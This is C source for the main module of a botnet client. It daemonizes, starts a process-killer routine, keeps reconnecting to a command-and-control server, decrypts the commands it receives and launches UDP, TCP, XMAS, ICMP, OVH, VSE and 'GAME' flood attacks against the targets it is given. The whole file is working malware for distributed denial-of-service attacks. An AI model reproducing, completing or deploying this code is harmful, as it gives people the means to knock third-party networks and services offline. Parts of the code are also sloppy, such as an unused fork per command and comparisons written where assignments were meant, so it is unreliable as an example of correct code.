#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <dirent.h>
#include <string.h>

#include "headers/main.h"
#include "headers/encryption.h"
#include "headers/debug.h"
#include "headers/config.h"
#include "headers/utils.h"
#include "headers/killer.h"

int sock_fd = -1;
char buf[1024];

void cmdparse(int argc, unsigned char *argv[]){
	int commandfork;
    commandfork = fork();

    if(util_strcmp(argv[0], "UDP") == 0){
    	if(argc < 4 || argc > 4)
    		return;
    	udpplainattack(argv[1], atoi(argv[2]), atoi(argv[3]));
    }
    if(util_strcmp(argv[0], "VSE") == 0){
    	if(argc < 4 || argc > 4)
    		return;
    	udpvseattack(argv[1], atoi(argv[2]), atoi(argv[3]));
    }
    if(util_strcmp(argv[0], "OVH") == 0){
    	if(argc < 4 || argc > 4)
    		return;
    	udpovhattack(argv[1], atoi(argv[2]), atoi(argv[3]));
    }
    if(util_strcmp(argv[0], "TCP") == 0){
    	if(argc < 4 || argc > 4)
    		return;
    	tcpattack(argv[1], atoi(argv[2]), atoi(argv[3]));
    }
    if(util_strcmp(argv[0], "XMAS") == 0){
    	if(argc < 4 || argc > 4)
    		return;
    	xmasattack(argv[1], atoi(argv[2]), atoi(argv[3]));
    }
    if(util_strcmp(argv[0], "ICMP") == 0){
    	if(argc < 4 || argc > 4)
    		return;
    	icmpattack(argv[1], atoi(argv[2]), atoi(argv[3]));
    }
    if(util_strcmp(argv[0], "GAME") == 0){
    	if(argc < 4 || argc > 4)
    		return;
    	gameattack(argv[1], atoi(argv[2]), atoi(argv[3]));
    }
    if(util_strcmp(argv[0], "DUP") == 0){
    	exit(0);
    }
}

void commandparsing(char *buf) {
    int i, argc = 0;
    unsigned char *argv[MAX_PARAMS + 1] = { 0 };
    char *token = strtok(buf, " ");

    while (token != NULL && argc < MAX_PARAMS) {
        argv[argc++] = malloc(util_strlen(token) + 1);
        util_strcpy(argv[argc - 1], token);
        token = strtok(NULL, " ");
    }

    if(argc > 0)
        cmdparse(argc, argv);

    for (i = 0; i < argc; i++)
        free(argv[i]);
}

void _connect(){
	int recv_fd, i = 0;
	sock_fd = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in addr;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(BOT_PORT);
	addr.sin_addr.s_addr = inet_addr(connection_ip);

	DEBUG_PRINT("attempting to connect\n");

	if(connect(sock_fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != -1){
		DEBUG_PRINT("connected to c2\n");
		sleep(2);
		while(recv(sock_fd, buf, 1024, MSG_NOSIGNAL)){
			if(util_strlen(buf) > 1){
				buf[strcspn(buf, "\n")] == 0;
				buf[strcspn(buf, "\r\n")] == 0;

				DEBUG_PRINT("received encrypted message %s len %d\n", buf, util_strlen(buf));

				decrypt_for_recv(buf);

				DEBUG_PRINT("received decreypted message %s len %d\n", dec_buf, util_strlen(dec_buf));

				commandparsing(dec_buf);
				memset(buf, 0, sizeof(buf));
			}
		}
	} else {
		DEBUG_PRINT("failed to connect\n");
		close(sock_fd);
	}
}

int main(int argc, char **args){
	signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    srand(time(NULL) ^ getpid());

#ifndef DEBUG
	if(fork() >0)
        return;
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    init_killer();

	while(TRUE){
		_connect();
		sleep(5);
	}

	return 0;
}
